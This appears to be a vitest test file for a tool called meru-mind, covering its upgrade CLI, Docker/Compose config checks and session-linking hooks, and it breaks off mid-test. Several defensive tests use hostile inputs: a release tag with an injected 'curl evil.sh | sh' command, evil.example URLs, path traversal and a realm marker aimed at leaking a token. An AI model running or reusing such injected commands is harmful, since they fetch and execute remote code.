import { execFile } from "node:child_process";
import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import { promisify } from "node:util";
import { afterEach, describe, expect, it } from "vitest";
import {
  checkForUpgrade,
  compareSemver,
  createInvite,
  DEFAULT_SHELL_CSS,
  detectInstallMode,
  extractClientIp,
  isTrustedProxyIp,
  lookupHarnessParentSession,
  MERU_MIND_VERSION,
  MindError,
  recordHarnessParentLink,
  RemoteMindSurface,
  resolveHarnessSessionContext,
  runUpgrade,
  sanitizeDisplayName,
  SqliteDb,
  startMindServer,
  type MindServerHandle,
  type PulseListResult,
} from "../src/index.js";

const execFileAsync = promisify(execFile);

const tempDirs: string[] = [];
const openServers: MindServerHandle[] = [];
const mockHttpServers: http.Server[] = [];

function makeTempDir(prefix: string): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  tempDirs.push(dir);
  return dir;
}

async function startMockJsonServer(
  handler: (req: http.IncomingMessage, res: http.ServerResponse) => void,
): Promise<{ url: string; server: http.Server }> {
  const server = http.createServer(handler);
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const addr = server.address();
  if (!addr || typeof addr === "string") {
    throw new Error("Failed to bind mock HTTP server");
  }
  mockHttpServers.push(server);
  return { url: `http://127.0.0.1:${addr.port}`, server };
}

afterEach(async () => {
  while (openServers.length > 0) {
    await openServers.pop()!.close().catch(() => {});
  }
  while (mockHttpServers.length > 0) {
    const srv = mockHttpServers.pop()!;
    await new Promise<void>((resolve) => srv.close(() => resolve()));
  }
  while (tempDirs.length > 0) {
    fs.rmSync(tempDirs.pop()!, { recursive: true, force: true });
  }
});

describe("v0.6.2 Upgrade CLI, GHCR/Compose, Multi-Harness Session Propagation & v0.6.1 Hardenings", () => {
  it("1. CLI upgrade/update & module: --check with mock Releases API + remote /v1/health, container guard, dirty/clean git, npm/pnpm global & offline errors", async () => {
    // 1a. compareSemver
    expect(compareSemver("0.6.1", "0.6.2")).toBe(-1);
    expect(compareSemver("v0.6.2", "0.6.2")).toBe(0);
    expect(compareSemver("0.6.3", "v0.6.2")).toBe(1);
    expect(compareSemver("0.6.2-rc.1", "0.6.2")).toBe(-1);
    expect(compareSemver("0.6.2", "0.6.2-rc.1")).toBe(1);
    expect(compareSemver("0.6.2-alpha.1", "0.6.2-beta.1")).toBe(-1);

    // 1b. detectInstallMode (container: Docker/Podman/K8s / git / unknown — NEVER auto-executes npmjs.org)
    expect(
      detectInstallMode({
        scriptPath: "/app/dist/cli.js",
        env: { MERU_MIND_IN_CONTAINER: "1" },
        fsExists: () => false,
        readFile: () => "",
      }).mode,
    ).toBe("container");
    expect(
      detectInstallMode({
        scriptPath: "/app/dist/cli.js",
        env: {},
        fsExists: (p) => p === "/.dockerenv",
        readFile: () => "",
      }).mode,
    ).toBe("container");
    expect(
      detectInstallMode({
        scriptPath: "/app/dist/cli.js",
        env: {},
        fsExists: (p) => p === "/run/.containerenv",
        readFile: () => "",
      }).mode,
    ).toBe("container");
    expect(
      detectInstallMode({
        scriptPath: "/app/dist/cli.js",
        env: { KUBERNETES_SERVICE_HOST: "10.96.0.1" },
        fsExists: () => false,
        readFile: () => "",
      }).mode,
    ).toBe("container");
    expect(
      detectInstallMode({
        scriptPath: "/app/dist/cli.js",
        env: {},
        fsExists: () => false,
        readFile: (p) => (p === "/proc/1/cgroup" ? "0::/docker/abc123\n" : ""),
      }).mode,
    ).toBe("container");
    expect(
      detectInstallMode({
        scriptPath: "/srv/src/meru-mind/dist/cli.js",
        env: {},
        fsExists: (p) =>
          p === "/srv/src/meru-mind/package.json" ||
          p === "/srv/src/meru-mind/.git",
        readFile: (p) =>
          p === "/srv/src/meru-mind/package.json"
            ? JSON.stringify({ name: "@meru-mind/core", version: "0.6.1" })
            : "",
      }),
    ).toMatchObject({ mode: "git", rootDir: "/srv/src/meru-mind" });
    expect(
      detectInstallMode({
        scriptPath: "/usr/local/lib/node_modules/@meru-mind/core/dist/cli.js",
        env: {},
        fsExists: () => false,
        readFile: () => "",
      }).mode,
    ).toBe("unknown");

    // 1c. Live mock GitHub Releases API + real server /v1/health via CLI `upgrade --check` & alias `update --check`
    const mockRelease = await startMockJsonServer((_req, res) => {
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(
        JSON.stringify({
          tag_name: "v0.7.0",
          html_url: "https://github.com/Matthewoho/meru-mind/releases/tag/v0.7.0",
          published_at: "2026-11-26T00:00:00Z",
        }),
      );
    });
    const srv = await startMindServer({
      homeDir: makeTempDir("meru-v062-upgrade-srv-"),
      host: "127.0.0.1",
      port: 0,
      enableVector: false,
      accessLog: false,
    });
    openServers.push(srv);

    const { stdout: upgradeJsonOut } = await execFileAsync(
      process.execPath,
      [
        path.resolve("dist/cli.js"),
        "upgrade",
        "--check",
        "--url",
        srv.url,
        "--json",
      ],
      {
        env: {
          ...process.env,
          MERU_MIND_RELEASES_API_URL: `${mockRelease.url}/releases/latest`,
        },
      },
    );
    const upgradeJson = JSON.parse(upgradeJsonOut) as {
      upgraded: boolean;
      checkOnly: boolean;
      previousVersion: string;
      latestVersion: string;
      remoteServer?: { url: string; version: string; updateAvailable: boolean };
    };
    expect(upgradeJson.upgraded).toBe(false);
    expect(upgradeJson.checkOnly).toBe(true);
    expect(upgradeJson.previousVersion).toBe(MERU_MIND_VERSION);
    expect(upgradeJson.latestVersion).toBe("0.7.0");
    expect(upgradeJson.remoteServer?.url).toBe(srv.url);
    expect(upgradeJson.remoteServer?.version).toBe(MERU_MIND_VERSION);
    expect(upgradeJson.remoteServer?.updateAvailable).toBe(true);

    // Alias `update --check --json` works identically
    const { stdout: aliasOut } = await execFileAsync(
      process.execPath,
      [path.resolve("dist/cli.js"), "update", "--check", "--json"],
      {
        env: {
          ...process.env,
          MERU_MIND_RELEASES_API_URL: `${mockRelease.url}/releases/latest`,
        },
      },
    );
    expect(JSON.parse(aliasOut).latestVersion).toBe("0.7.0");

    // 1d. Container mode MUST refuse self-upgrade and print `docker compose pull`
    const containerCalls: string[] = [];
    const containerRes = await runUpgrade({
      currentVersion: "0.6.1",
      releasesApiUrl: `${mockRelease.url}/releases/latest`,
      installInfo: { mode: "container", rootDir: null, scriptPath: "/app/dist/cli.js" },
      execFileImpl: async (bin, args) => {
        containerCalls.push(`${bin} ${args.join(" ")}`);
        return { stdout: "", stderr: "" };
      },
    });
    expect(containerRes.upgraded).toBe(false);
    expect(containerRes.inContainer).toBe(true);
    expect(containerRes.mode).toBe("container");
    expect(containerRes.instructions.join("\n")).toContain("docker compose pull");
    expect(containerRes.instructions.join("\n")).toContain("meru-mind admin backup");
    expect(containerCalls).toHaveLength(0);

    // 1e. Dirty git checkout MUST refuse with MindError("CONFLICT") before running any pull/build
    const dirtyCalls: string[] = [];
    await expect(
      runUpgrade({
        currentVersion: "0.6.1",
        releasesApiUrl: `${mockRelease.url}/releases/latest`,
        installInfo: {
          mode: "git",
          rootDir: "/tmp/fake-repo",
          scriptPath: "/tmp/fake-repo/dist/cli.js",
        },
        execFileImpl: async (bin, args) => {
          dirtyCalls.push(`${bin} ${args.join(" ")}`);
          if (bin === "git" && args[0] === "status") {
            return { stdout: " M src/cli.ts\n", stderr: "" };
          }
          return { stdout: "", stderr: "" };
        },
      }),
    ).rejects.toSatisfy((err: unknown) => err instanceof MindError && err.code === "CONFLICT");
    expect(dirtyCalls).toEqual(["git status --porcelain"]);

    // 1f. Clean git upgrade executes exact safe execFile steps & reads updated package.json
    const cleanCalls: string[] = [];
    const cleanRes = await runUpgrade({
      currentVersion: "0.6.1",
      releasesApiUrl: `${mockRelease.url}/releases/latest`,
      installInfo: {
        mode: "git",
        rootDir: "/tmp/fake-repo",
        scriptPath: "/tmp/fake-repo/dist/cli.js",
      },
      execFileImpl: async (bin, args) => {
        cleanCalls.push(`${bin} ${args.join(" ")}`);
        return { stdout: "", stderr: "" };
      },
      readFile: () => JSON.stringify({ name: "@meru-mind/core", version: "0.7.0" }),
    });
    expect(cleanRes.upgraded).toBe(true);
    expect(cleanRes.newVersion).toBe("0.7.0");
    expect(cleanCalls).toEqual([
      "git status --porcelain",
      "git fetch --tags",
      "git pull --ff-only",
      "pnpm install --frozen-lockfile",
      "pnpm build",
    ]);

    // 1g. Unknown / non-git install MUST NEVER execute or recommend unowned npmjs.org @meru-mind/core
    const unknownCalls: string[] = [];
    const unknownRes = await runUpgrade({
      currentVersion: "0.6.1",
      releasesApiUrl: `${mockRelease.url}/releases/latest`,
      installInfo: { mode: "unknown", rootDir: null, scriptPath: "/usr/lib/node_modules/@meru-mind/core/dist/cli.js" },
      execFileImpl: async (bin, args) => {
        unknownCalls.push(`${bin} ${args.join(" ")}`);
        return { stdout: "", stderr: "" };
      },
    });
    expect(unknownRes.upgraded).toBe(false);
    expect(unknownRes.mode).toBe("unknown");
    expect(unknownCalls).toHaveLength(0);
    expect(unknownRes.instructions.join("\n")).not.toContain("@meru-mind/core");
    expect(unknownRes.instructions.join("\n")).toContain("docker compose pull");

    // 1g-2. Untrusted/injected tag_name & non-repo html_url are rejected cleanly
    const badTagCheck = await checkForUpgrade({
      currentVersion: "0.6.2",
      fetchImpl: (async () =>
        new Response(
          JSON.stringify({
            tag_name: "v0.7.0\n$ curl evil.sh | sh",
            html_url: "https://evil.example/releases/v0.7.0",
          }),
          { status: 200, headers: { "Content-Type": "application/json" } },
        )) as unknown as typeof fetch,
      installInfo: { mode: "unknown", rootDir: null, scriptPath: "/opt/cli.js" },
    });
    expect(badTagCheck.latestVersion).toBeNull();
    expect(badTagCheck.releaseUrl).toBeNull();
    expect(badTagCheck.checkError).toMatch(/invalid semver/i);

    const badUrlCheck = await checkForUpgrade({
      currentVersion: "0.6.2",
      fetchImpl: (async () =>
        new Response(
          JSON.stringify({
            tag_name: "v0.7.0",
            html_url: "https://github.com/Matthewoho/meru-mind/releases/../../../evil/x",
          }),
          { status: 200, headers: { "Content-Type": "application/json" } },
        )) as unknown as typeof fetch,
      installInfo: { mode: "unknown", rootDir: null, scriptPath: "/opt/cli.js" },
    });
    expect(badUrlCheck.latestVersion).toBe("0.7.0");
    expect(badUrlCheck.releaseUrl).toBeNull();

    // 1h. Already up to date -> no commands run
    const upToDateCalls: string[] = [];
    const upToDateRes = await runUpgrade({
      currentVersion: "0.7.0",
      releasesApiUrl: `${mockRelease.url}/releases/latest`,
      installInfo: { mode: "git", rootDir: "/tmp/fake-repo", scriptPath: "/tmp/fake-repo/dist/cli.js" },
      execFileImpl: async (bin, args) => {
        upToDateCalls.push(`${bin} ${args.join(" ")}`);
        return { stdout: "", stderr: "" };
      },
    });
    expect(upToDateRes.upgraded).toBe(false);
    expect(upToDateRes.upToDate).toBe(true);
    expect(upToDateCalls).toHaveLength(0);

    // 1i. Offline / network error and HTTP 429 rate-limit handled gracefully without throwing
    const offlineCheck = await checkForUpgrade({
      currentVersion: "0.6.2",
      fetchImpl: (async () => {
        throw new Error("ENOTFOUND api.github.com");
      }) as unknown as typeof fetch,
      installInfo: { mode: "unknown", rootDir: null, scriptPath: "/opt/cli.js" },
    });
    expect(offlineCheck.latestVersion).toBeNull();
    expect(offlineCheck.checkError).toMatch(/ENOTFOUND/);

    const rateLimitCheck = await checkForUpgrade({
      currentVersion: "0.6.2",
      fetchImpl: (async () => new Response("rate limited", { status: 429 })) as unknown as typeof fetch,
      installInfo: { mode: "unknown", rootDir: null, scriptPath: "/opt/cli.js" },
    });
    expect(rateLimitCheck.latestVersion).toBeNull();
    expect(rateLimitCheck.checkError).toMatch(/429|rate limit/i);
  });

  it("2. GHCR workflow, prebuilt Compose files, build override, Caddyfile X-Real-IP, and docker compose config validation", async () => {
    const wf = fs.readFileSync(
      path.resolve(".github/workflows/docker-publish.yml"),
      "utf8",
    );
    expect(wf).toContain("ghcr.io");
    expect(wf).toContain("packages: write");
    expect(wf).toContain("attestations: write");
    expect(wf).toContain("id-token: write");
    expect(wf).toContain("contents: read");
    expect(wf).toContain("docker/setup-qemu-action@v3");
    expect(wf).toContain("docker/setup-buildx-action@v3");
    expect(wf).toContain("docker/login-action@v3");
    expect(wf).toContain("docker/metadata-action@v5");
    expect(wf).toContain("docker/build-push-action@v6");
    expect(wf).toContain("platforms: linux/amd64,linux/arm64");
    expect(wf).toContain("file: deploy/Dockerfile");
    expect(wf).toContain("type=ref,event=tag");
    expect(wf).toContain("type=semver,pattern={{version}}");
    expect(wf).toContain("type=semver,pattern={{major}}.{{minor}}");
    expect(wf).toContain("if: (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || (github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main')");
    expect(wf).toContain("persist-credentials: false");
    expect(wf).toContain("^(dev|preview)-[a-z0-9._-]{1,40}$");
    expect(wf).toContain("latest=false");

    const expectedImageLine = `image: ghcr.io/matthewoho/meru-mind:\${MERU_MIND_TAG:-v${MERU_MIND_VERSION}}`;
    for (const rel of [
      "deploy/docker-compose.yml",
      "deploy/docker-compose.oidc-pocketid.yml",
      "deploy/docker-compose.oidc-dex.yml",
    ]) {
      const content = fs.readFileSync(path.resolve(rel), "utf8");
      expect(content, `${rel} must use prebuilt GHCR image`).toContain(
        expectedImageLine,
      );
      expect(content, `${rel} must enforce no-new-privileges`).toContain(
        "no-new-privileges:true",
      );
      expect(content, `${rel} must not inline build:`).not.toMatch(
        /^\s+build:\s*$/m,
      );
    }

    const buildOverride = fs.readFileSync(
      path.resolve("deploy/docker-compose.build.yml"),
      "utf8",
    );
    expect(buildOverride).toContain("dockerfile: deploy/Dockerfile");
    expect(buildOverride).toContain("context: ..");

    const caddyfile = fs.readFileSync(path.resolve("deploy/Caddyfile"), "utf8");
    expect(caddyfile).toContain("header_up X-Real-IP {remote_host}");

    // Validate all compose files with real `docker compose config` when docker is available
    let hasDocker = false;
    try {
      await execFileAsync("docker", ["compose", "version"]);
      hasDocker = true;
    } catch {
      hasDocker = false;
    }
    if (hasDocker) {
      const expectedResolvedImage = `ghcr.io/matthewoho/meru-mind:v${MERU_MIND_VERSION}`;
      const { stdout: baseCfg } = await execFileAsync("docker", [
        "compose",
        "-f",
        "deploy/docker-compose.yml",
        "config",
      ]);
      expect(baseCfg).toContain(expectedResolvedImage);

      const { stdout: buildCfg } = await execFileAsync("docker", [
        "compose",
        "-f",
        "deploy/docker-compose.yml",
        "-f",
        "deploy/docker-compose.build.yml",
        "config",
      ]);
      expect(buildCfg).toContain("dockerfile: deploy/Dockerfile");

      const { stdout: pocketCfg } = await execFileAsync(
        "docker",
        ["compose", "-f", "deploy/docker-compose.oidc-pocketid.yml", "config"],
        {
          env: {
            ...process.env,
            MERU_DOMAIN: "mind.example.com",
            OIDC_DOMAIN: "id.example.com",
            POCKET_ID_ENCRYPTION_KEY: "test-encryption-key-placeholder-32b",
            MERU_OIDC_CLIENT_ID: "pocket-client",
          },
        },
      );
      expect(pocketCfg).toContain(expectedResolvedImage);

      const { stdout: dexCfg } = await execFileAsync(
        "docker",
        ["compose", "-f", "deploy/docker-compose.oidc-dex.yml", "config"],
        {
          env: {
            ...process.env,
            MERU_DOMAIN: "mind.example.com",
            OIDC_DOMAIN: "auth.example.com",
            MERU_OIDC_CLIENT_ID: "meru-mind",
            MERU_OIDC_CLIENT_SECRET: "dex-secret",
          },
        },
      );
      expect(dexCfg).toContain(expectedResolvedImage);
    }
  });

  it("3. Multi-harness session propagation: priority chain, parent-map 0600/TTL/self-parent, subagent-link.sh + session-start.sh (AGY camelCase & Claude snake_case) & live RemoteMindSurface MindPulse tree", async () => {
    const cacheDir = makeTempDir("meru-v062-parent-map-");
    const mapFile = path.join(cacheDir, "parent-map.json");
    const baseEnv = { MERU_MIND_PARENT_MAP_FILE: mapFile };

    // 3a. Priority chain & auto-inferred clientHint
    expect(
      resolveHarnessSessionContext({
        ...baseEnv,
        MERU_MIND_SESSION_ID: "explicit-1",
        ANTIGRAVITY_CONVERSATION_ID: "agy-conv-1",
      }),
    ).toEqual({
      sessionTag: "explicit-1",
      parentSessionTag: null,
      clientHint: "antigravity",
    });
    expect(
      resolveHarnessSessionContext({
        ...baseEnv,
        ANTIGRAVITY_CONVERSATION_ID: "agy-conv-2",
        ANTIGRAVITY_PARENT_CONVERSATION_ID: "agy-parent-2",
      }),
    ).toEqual({
      sessionTag: "agy-conv-2",
      parentSessionTag: "agy-parent-2",
      clientHint: "antigravity",
    });
    expect(
      resolveHarnessSessionContext({
        ...baseEnv,
        CLAUDE_SESSION_ID: "claude-1",
        CLAUDE_PARENT_SESSION_ID: "claude-parent",
      }),
    ).toEqual({
      sessionTag: "claude-1",
      parentSessionTag: "claude-parent",
      clientHint: "claude-code",
    });
    expect(
      resolveHarnessSessionContext({
        ...baseEnv,
        CODEX_THREAD_ID: "codex-1",
        CODEX_PARENT_THREAD_ID: "codex-parent",
      }),
    ).toEqual({
      sessionTag: "codex-1",
      parentSessionTag: "codex-parent",
      clientHint: "codex",
    });
    expect(
      resolveHarnessSessionContext({
        ...baseEnv,
        OPENCODE_SESSION_ID: "opencode-1",
      }),
    ).toEqual({
      sessionTag: "opencode-1",
      parentSessionTag: null,
      clientHint: "opencode",
    });

    // Self-parent is always rejected
    expect(
      recordHarnessParentLink({
        childSessionId: "same-id",
        parentSessionId: "same-id",
        env: baseEnv,
      }),
    ).toBe(false);

    // Record link -> mode 0600, TTL lookup & pruning
    const t0 = 1_750_000_000_000;
    expect(
      recordHarnessParentLink({
        childSessionId: "child-ttl",
        parentSessionId: "parent-ttl",
        env: baseEnv,
        nowMs: t0,
      }),
    ).toBe(true);
    if (process.platform !== "win32") {
      const mode = fs.statSync(mapFile).mode & 0o777;
      expect(mode).toBe(0o600);
    }
    expect(lookupHarnessParentSession("child-ttl", baseEnv, t0 + 1000)).toBe(
      "parent-ttl",
    );
    expect(
      lookupHarnessParentSession("child-ttl", baseEnv, t0 + 25 * 3600 * 1000),
    ).toBeNull();

    // Corrupt parent-map.json never crashes lookup; prototype keys & future timestamps rejected
    const corruptMap = path.join(cacheDir, "corrupt.json");
    fs.writeFileSync(corruptMap, "{not-valid-json", "utf8");
    expect(
      lookupHarnessParentSession("anything", {
        MERU_MIND_PARENT_MAP_FILE: corruptMap,
      }),
    ).toBeNull();
    expect(lookupHarnessParentSession("constructor", baseEnv, t0 + 1000)).toBeNull();
    expect(lookupHarnessParentSession("toString", baseEnv, t0 + 1000)).toBeNull();
    const futureMap = path.join(cacheDir, "future.json");
    fs.writeFileSync(
      futureMap,
      JSON.stringify({
        version: 1,
        links: { "future-child": { parent: "future-parent", updatedAt: t0 + 365 * 24 * 3600 * 1000 } },
      }),
      "utf8",
    );
    expect(
      lookupHarnessParentSession(
        "future-child",
        { MERU_MIND_PARENT_MAP_FILE: futureMap },
        t0,
      ),
    ).toBeNull();

    // 3b. End-to-end hooks (subagent-link.sh + session-start.sh) + live server MindPulse collaborator tree
    const srv = await startMindServer({
      homeDir: makeTempDir("meru-v062-pulse-srv-"),
      host: "127.0.0.1",
      port: 0,
      enableVector: false,
      accessLog: false,
    });
    openServers.push(srv);
    const agentTok = srv.createToken({ actorId: "swarm-bot", actorKind: "agent" });

    const workDir = makeTempDir("meru-v062-hook-repo-");
    fs.writeFileSync(path.join(workDir, ".meru-mind-realm"), "/\n", "utf8");
    const hooksDir = path.resolve("examples/hooks");
    const hookMapFile = path.join(cacheDir, "hook-parent-map.json");

    // Verify agy-hooks.json is valid JSON wiring subagent-link.sh
    const agyHooks = JSON.parse(
      fs.readFileSync(path.join(hooksDir, "agy-hooks.json"), "utf8"),
    ) as { hooks: Record<string, unknown> };
    expect(agyHooks.hooks).toHaveProperty("SessionStart");
    expect(agyHooks.hooks).toHaveProperty("PostToolUse");
    expect(agyHooks.hooks).toHaveProperty("Stop");
    expect(JSON.stringify(agyHooks)).toContain("invoke_subagent|swarm");
    expect(JSON.stringify(agyHooks)).toContain("subagent-link.sh");

    const runHook = (
      script: string,
      stdinObj: Record<string, unknown>,
      extraEnv: Record<string, string> = {},
    ): Promise<string> =>
      new Promise((resolve, reject) => {
        const child = execFile(
          "bash",
          [path.join(hooksDir, script)],
          {
            cwd: workDir,
            encoding: "utf8",
            env: {
              ...process.env,
              MERU_MIND_URL: srv.url,
              MERU_MIND_TOKEN: agentTok.token,
              MERU_MIND_PARENT_MAP_FILE: hookMapFile,
              MERU_MIND_BIN: `${process.execPath} ${path.resolve("dist/cli.js")}`,
              ...extraEnv,
            },
          },
          (err, stdout) => {
            if (err) reject(err);
            else resolve(stdout);
          },
        );
        child.stdin?.end(JSON.stringify(stdinObj));
      });

    // Antigravity parent starts via camelCase JSON -> emits valid JSON on stdout
    const agyParentStart = await runHook("session-start.sh", {
      conversationId: "agy-parent-conv",
      workspacePaths: [workDir],
    });
    expect(() => JSON.parse(agyParentStart)).not.toThrow();

    // Antigravity parent invokes subagent -> subagent-link.sh links child -> parent & emits `{}`
    const agyLinkOut = await runHook("subagent-link.sh", {
      conversationId: "agy-parent-conv",
      toolName: "invoke_subagent",
      toolOutput: JSON.stringify({ conversationId: "agy-child-conv" }),
    });
    expect(JSON.parse(agyLinkOut)).toEqual({});
    expect(
      lookupHarnessParentSession("agy-child-conv", {
        MERU_MIND_PARENT_MAP_FILE: hookMapFile,
      }),
    ).toBe("agy-parent-conv");

    // Antigravity child starts via camelCase JSON (without explicit parentConversationId) -> auto-resolves parent!
    const agyChildStart = await runHook("session-start.sh", {
      conversationId: "agy-child-conv",
      workspacePaths: [workDir],
    });
    expect(() => JSON.parse(agyChildStart)).not.toThrow();

    // Malicious free-text in toolOutput MUST NOT be regex-scraped, and existing unexpired parent link MUST NOT be overwritten
    const spoofLinkOut = await runHook("subagent-link.sh", {
      conversationId: "spoof-parent-conv",
      toolName: "invoke_subagent",
      toolOutput: 'untrusted text mentioning conversationId="scraped-fake-child" and {"conversationId":"agy-child-conv"}',
    });
    expect(JSON.parse(spoofLinkOut)).toEqual({});
    expect(
      lookupHarnessParentSession("scraped-fake-child", {
        MERU_MIND_PARENT_MAP_FILE: hookMapFile,
      }),
    ).toBeNull();
    // Structured attempt to re-parent existing unexpired child MUST preserve first-writer parent
    await runHook("subagent-link.sh", {
      conversationId: "spoof-parent-conv",
      toolName: "invoke_subagent",
      toolOutput: JSON.stringify({ conversationId: "agy-child-conv" }),
    });
    expect(
      lookupHarnessParentSession("agy-child-conv", {
        MERU_MIND_PARENT_MAP_FILE: hookMapFile,
      }),
    ).toBe("agy-parent-conv");

    // Malicious `.meru-mind-realm` containing `--url=https://evil.example` MUST be ignored (NEVER exfiltrates token)
    const evilRepoDir = makeTempDir("meru-v062-evil-realm-");
    let evilHitCount = 0;
    const evilServer = await startMockJsonServer((_req, res) => {
      evilHitCount += 1;
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ ok: true }));
    });
    fs.writeFileSync(
      path.join(evilRepoDir, ".meru-mind-realm"),
      `--url=${evilServer.url}\n`,
      "utf8",
    );
    const evilStartOut = await runHook("session-start.sh", {
      conversationId: "agy-evil-test",
      workspacePaths: [evilRepoDir],
    });
    expect(JSON.parse(evilStartOut)).toEqual({});
    expect(evilHitCount).toBe(0);

    // Layer-1 independent falsification of validateRealmPath:
    // Even with POSIX `--` active, a valid non-realm ref (e.g. a real record ID `rec_...`) or `..` traversal
    // in `.meru-mind-realm` MUST be rejected BEFORE calling `/v1/pulse` or `meru-mind show`.
    const seedSurf = await RemoteMindSurface.connect({
      baseUrl: srv.url,
      token: agentTok.token,
    });
    const seededRec = await seedSurf.write({
      realmRef: "/",
      title: "Secret Non-Realm Target",
      body: "Must never be injected by non-realm marker",
    });
    await seedSurf.close();

    let spyPulseHits = 0;
    const pulseSpy = await startMockJsonServer((_req, res) => {
      spyPulseHits += 1;
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ ok: true }));
    });
    for (const badMarker of [seededRec.record.id, "/ops/../secret"]) {
      fs.writeFileSync(
        path.join(evilRepoDir, ".meru-mind-realm"),
        `${badMarker}\n`,
        "utf8",
      );
      const nonRealmOut = await runHook(
        "session-start.sh",
        {
          conversationId: "agy-layer1-test",
          workspacePaths: [evilRepoDir],
        },
        { MERU_MIND_URL: srv.url },
      );
      expect(JSON.parse(nonRealmOut)).toEqual({});
      const spyOut = await runHook(
        "session-start.sh",
        {
          conversationId: "agy-layer1-spy",
          workspacePaths: [evilRepoDir],
        },
        { MERU_MIND_URL: pulseSpy.url },
      );
      expect(JSON.parse(spyOut)).toEqual({});
    }
    expect(spyPulseHits).toBe(0);

    // Claude Code snake_case parent spawns subagent -> subagent-link.sh links agent_id -> session_id
    const claudeLinkOut = await runHook("subagent-link.sh", {
      session_id: "claude-parent-sess",
      tool_name: "Agent",
      tool_response: { agent_id: "claude-child-sess" },
    });
    expect(JSON.parse(claudeLinkOut)).toEqual({});
    expect(
      lookupHarnessParentSession("claude-child-sess", {
        MERU_MIND_PARENT_MAP_FILE: hookMapFile,
      }),
    ).toBe("claude-parent-sess");

    // Claude Code child runs session-start.sh (plain text stdout, NOT wrapped in JSON)
    const claudeChildStart = await runHook("session-start.sh", {
      session_id: "claude-child-sess",
      cwd: workDir,
    });
    expect(claudeChildStart).not.toMatch(/^\s*\{\s*"injectSteps"/);

    // Verify in live server MindPulse that agy-child-conv is attached under agy-parent-conv with clientHint="antigravity"
    const pulseAfterHooks = (await (
      await fetch(`${srv.url}/v1/pulse`, {
        headers: { Authorization: `Bearer ${agentTok.token}` },
      })
    ).json()) as PulseListResult;
    const parentEntry = pulseAfterHooks.pulses.find(
      (p) => p.sessionTag === "agy-parent-conv",
    );
    const childEntry = pulseAfterHooks.pulses.find(
      (p) => p.sessionTag === "agy-child-conv",
    );
    expect(parentEntry).toBeDefined();
    expect(childEntry).toBeDefined();
    expect(childEntry?.clientHint).toBe("antigravity");
    expect(childEntry?.parentSessionId).toBe(parentEntry?.sessionId);
    expect(childEntry?.rootSessionId).toBe(parentEntry?.rootSessionId);

    // 3c. RemoteMindSurface auto-propagates X-Meru-Session-Id, X-Meru-Parent-Session-Id & X-Meru-Client from env + parent-map.json!
    const prevAgy = process.env.ANTIGRAVITY_CONVERSATION_ID;
    const prevMap = process.env.MERU_MIND_PARENT_MAP_FILE;
    const prevSid = process.env.MERU_MIND_SESSION_ID;
    const prevParent = process.env.MERU_MIND_PARENT_SESSION_ID;
    const prevClient = process.env.MERU_MIND_CLIENT;
    try {
      delete process.env.MERU_MIND_SESSION_ID;
      delete process.env.MERU_MIND_PARENT_SESSION_ID;
      delete process.env.MERU_MIND_CLIENT;
      process.env.MERU_MIND_PARENT_MAP_FILE = hookMapFile;
      recordHarnessParentLink({
        childSessionId: "agy-sdk-child",
        parentSessionId: "agy-parent-conv",
        env: { MERU_MIND_PARENT_MAP_FILE: hookMapFile },
      });
      process.env.ANTIGRAVITY_CONVERSATION_ID = "agy-sdk-child";

      const surface = await RemoteMindSurface.connect({
        baseUrl: srv.url,
        token: agentTok.token,
      });
      await surface.show({ ref: "/" });
      await surface.close();

      const pulseAfterSdk = (await (
        await fetch(`${srv.url}/v1/pulse`, {
          headers: { Authorization: `Bearer ${agentTok.token}` },
        })
      ).json()) as PulseListResult;
      const sdkChild = pulseAfterSdk.pulses.find(
        (p) => p.sessionTag === "agy-sdk-child",
      );
      expect(sdkChild).toBeDefined();
      expect(sdkChild?.clientHint).toBe("antigravity");
      expect(sdkChild?.parentSessionId).toBe(parentEntry?.sessionId);
      expect(sdkChild?.rootSessionId).toBe(parentEntry?.rootSessionId);
    } finally {
      if (prevAgy === undefined) delete process.env.ANTIGRAVITY_CONVERSATION_ID;
      else process.env.ANTIGRAVITY_CONVERSATION_ID = prevAgy;
      if (prevMap === undefined) delete process.env.MERU_MIND_PARENT_MAP_FILE;
      else process.env.MERU_MIND_PARENT_MAP_FILE = prevMap;
      if (prevSid === undefined) delete process.env.MERU_MIND_SESSION_ID;
      else process.env.MERU_MIND_SESSION_ID = prevSid;
      if (prevParent === undefined) delete process.env.MERU_MIND_PARENT_SESSION_ID;
      else process.env.MERU_MIND_PARENT_SESSION_ID = prevParent;
      if (prevClient === undefined) delete process.env.MERU_MIND_CLIENT;
      else process.env.MERU_MIND_CLIENT = prevClient;
    }
  });

  it("4. Seals all 6 v0.6.1 P1/P2 polish items: /v1/me/profile guards, exact proxy CIDR BlockList, strict admin-actor invariants, unified NFKC/\\p{C} sanitizeDisplayName, and 11px badge CSS", async () => {
    const srv = await startMindServer({
      homeDir: makeTempDir("meru-v062-hardening-"),
      host: "127.0.0.1",
      port: 0,
      enableVector: false,
      accessLog: false,
    });
    openServers.push(srv);

    const adminTok = srv.createToken({ actorId: "admin", actorKind: "human" });
    const agentTok = srv.createToken({ actorId: "worker-bot", actorKind: "agent" });

    // Create sub-realm /sub
    const adminSurface = await RemoteMindSurface.connect({
      baseUrl: srv.url,
      token: adminTok.token,
    });
    const subRealm = await adminSurface.createRealm({
      parentRef: "/",
      slug: "sub",
      name: "Sub Realm",
    });
    await adminSurface.close();

    const scopedHumanTok = srv.createToken({
      actorId: "scoped-alice",
      actorKind: "human",
      boundRealmId: subRealm.id,
    });

    // 4a. Agent token POST /v1/me/profile -> 403 ACCESS_DENIED
    const agentProfile = await fetch(`${srv.url}/v1/me/profile`, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${agentTok.token}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ displayName: "Spoofed Bot" }),
    });
    expect(agentProfile.status).toBe(403);

    // 4b. Non-object JSON bodies (`null`, `[]`) to POST /v1/me/profile -> 400 (NEVER 500)
    for (const rawBody of ["null", "[]", '"hello"']) {
      const badResp = await fetch(`${srv.url}/v1/me/profile`, {
        method: "POST",
        headers: {
          Authorization: `Bearer ${adminTok.token}`,
          "Content-Type": "application/json",
        },
